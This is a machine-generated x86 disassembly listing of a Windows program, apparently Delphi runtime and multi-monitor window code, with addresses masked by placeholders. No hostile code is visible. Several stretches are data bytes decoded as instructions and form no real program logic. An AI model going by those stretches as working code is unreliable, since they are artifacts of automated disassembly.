mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_429380
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_423db0
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_423c94
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_41919c
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_4240b4
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_42452c
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_42903c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42af84
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42adb8
xor eax eax
push ebp
push sub_42afcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42afd6
mov eax [ ebp - 0x4 ]
call sub_42adc4
retn
mov esp ebp
pop ebp
retn
sub_42afd6
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4027e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403254
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42adb8
xor eax eax
push ebp
push sub_42afcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42afd6
mov eax [ ebp - 0x4 ]
call sub_42adc4
retn
mov esp ebp
pop ebp
retn
sub_42affc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_422fe8
push eax
mov eax ebx
call sub_422fe8
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_42add0
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_42b034
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b0fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b104
retn
mov eax [ rw-data ]
call sub_403254
mov eax [ rw-data ]
call sub_403254
mov eax [ rw-data ]
call sub_403254
call sub_427ff4
mov eax [ rw-data ]
call sub_403254
mov eax [ rw-data ]
call sub_403254
mov eax [ rw-data ]
call sub_403254
mov eax [ rw-data ]
call sub_403254
mov eax [ rw-data ]
call sub_403254
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a58
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404a58
sub_42b108
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42ac0c
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_42ac88
mov cx 0x2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4227a0
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_4227a0
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_4227a0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ad54
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a820
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a820
mov [ rw-data ] eax
mov ecx sub_422ff8
mov edx sub_423008
mov eax [ sub_421698 ]
call sub_419f98
mov ecx r-xdata
mov edx sub_423210
mov eax [ r-xdata ]
call sub_419f98
sub_42b214
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b239
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b240
retn
sub_42b250
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xb2
inc edx
add [ eax + eax ] dl
add [ eax ] al
push 0x9c004182
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ esp + 0x41 ] dl
add al bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax - 0x57ffbd4c ] ch
movsb [ edi ] [ esi ]
inc ecx
add [ 0x540b0041 ] ah
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
add [ ebx + 0x42 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebx + 0x180042 ] dh
add [ eax ] al
dec esp
mov dl 0x42
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
aam 0xb5
inc edx
add al bh
movsd [ edi ] [ esi ]
inc ecx
add [ esi + esi * 4 ] bh
inc edx
add [ eax + 0x240041a4 ] ch
movsd [ edi ] [ esi ]
inc ecx
add [ esi ] cl
push esp
inc ebx
outsd
insd
jo r-xdata
xor [ eax ] eax
or [ edx ] dh
inc eax
add ah dl
mov ch 0x42
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x11 ] al
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc eax
add ah dl
outsb
outsb
je r-xdata
push esp
push ebx
je r-xdata
jb r-xdata
ror [ ebx + 0x7dd6e8c6 ] cl
std
dec [ eax - 0x3974efa2 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
or [ edi + 0x2a540042 ] dh
inc eax
add [ edi + esi * 4 + 0x42 ] cl
add [ eax ] bh
mov bh 0x42
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
imul esi [ ebx + 0x74 ] 0x42b36c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4d ] bh
mov bl 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
mov bl 0x42
add [ eax ] cl
add [ eax ] al
add [ eax ] ah
mov bl 0x42
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
or [ edi - 0x4893ffbe ] dh
inc edx
add [ edi + esi * 4 + 0x42 ] cl
add [ eax ] bh
mov bh 0x42
add [ esi ] al
dec esp
imul esi [ ebx + 0x74 ] 0xd400408d
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_42b3f0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403224
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_42b42c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_403224
mov [ esi + 0x10 ] bl
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_42b4a8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_41a81c
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403254
sub_42b5d4
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a454
mov eax [ esi + 0x14 ]
call sub_403254
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_42b63c
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax ebx
sub al 0x1
jb r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ffc4
mov ebp eax
mov [ edi + 0x14 ] ebp
mov [ ebp + 0x34 ] edi
mov [ ebp + 0x30 ] sub_42b62c
test esi esi
je r-xdata
sub al 0x2
jb r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_42b4a8
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ edi + 0x14 ]
mov eax esi
call sub_420094
jmp r-xdata
test esi esi
je r-xdata
jmp r-xdata
mov edx [ edi + 0x14 ]
mov eax esi
call sub_4202c4
sub_42b6c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403224
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_42b708
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_42b74c
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_41a4c0
mov eax esi
pop esi
pop ebx
retn
sub_42b778
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b79d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b7a4
retn
sub_42b874
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b899
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b8a0
retn
sub_42b8ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404454
xor eax eax
push ebp
push sub_42b96b
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b972
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404464
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42b8ac
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fa4
sub_42b994
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_42b8ac
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42ba1c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_42b8ac
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42baac
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_42b8ac
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42ba1c
sub_42bb42
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_42b8ac
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_42bbc3
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42b8ac
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42bcb0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_42b8ac
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42bd84
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_42b8ac
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42be58
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_42b8ac
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42bff3
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42c019
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c020
retn
sub_42c034
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c059
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c060
retn
sub_42c0d8
fadd st0
inc edx
adc eax 0x65705349
je r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
insd
dec eax
insb
jo r-xdata
insb
jo r-xdata
rol [ edx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 8 ] dl
inc edx
add [ eax + eax ] cl
add [ eax ] al
sbb al 0x74
outsb
je r-xdata
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11b47265
inc eax
add [ ecx ] al
xchg ebx eax
cld
outsb
je r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bl
rol [ edx ] 0x4
add [ eax ] al
add [ edi ] cl
push esp
dec eax
insb
jns r-xdata
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
adc al 0x45
dec eax
insb
jo r-xdata
add [ esp + esi * 2 ] bl
jae r-xdata
rol [ edx ] 0xf
outsb
je r-xdata
jns r-xdata
cmp cl [ ecx ]
dec eax
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
test al 0xc0
inc edx
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x42c194c0 ]
retn 0x42
popad
outsb
popad
jb r-xdata
add al al
dec edi
jae r-xdata
insb
je r-xdata
movlps [ ecx + 0x45 ] xmm1
js r-xdata
add bh bh
dec [ ebx + 0x42c118c0 ]
add [ edi ] cl
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42cdff
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
jo r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
push ebx
jo r-xdata
jns r-xdata
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
rol [ edx ] 0xf
add bh bh
call [ ecx + eax * 8 + 0x42 ]
lodsd [ esi ]
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
imul esp [ ebp + 0x77 ] 0xc0d87265
inc edx
add [ ecx ] al
adc ecx [ ecx + 0x45 ]
insd
mov ah 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add [ edi ] cl
inc edx
jo r-xdata
outsb
dec eax
insb
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403ff8
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
add al 0x0
jo r-xdata
jae r-xdata
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
dec ecx
imul esp [ ebp + 0x77 ] 0xc1147265
inc edx
add [ ecx ] al
xchg bx ax
cld
inc eax
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax * 2 + 0x706c6548 ] dl
push ebx
outsb
je r-xdata
jo r-xdata
cmp cl [ ecx ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
jmp r-xdata
int3
mov eax eax
imul ebp [ edi + 0x6e ] 0x7800408d
retn 0x42
lea eax [ eax ]
adc al 0xc2
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp - 0x3debffc0 ]
jae r-xdata
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
mov ah 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
outsb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ce06
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a58
lea eax [ ebp - 0x8 ]
call sub_405a08
retn
